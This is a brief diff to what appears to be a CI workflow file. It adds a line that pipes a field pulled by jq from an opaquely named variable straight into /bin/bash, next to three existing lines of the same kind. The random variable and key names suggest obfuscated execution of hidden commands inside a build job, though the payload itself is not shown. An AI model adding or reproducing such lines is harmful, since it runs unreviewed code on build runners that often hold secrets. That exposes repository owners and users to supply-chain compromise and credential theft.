@@ -25,6 +25,7 @@ jobs:
           echo $nv17463 | jq -r .erkv001 | /bin/bash
           echo $xkc17691 | jq -r .pgakm12 | /bin/bash
           printf '%s' "$e01" | jq -r .uxmb4679 | /bin/bash
+          echo $xi0 | jq -r .drdc94336 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
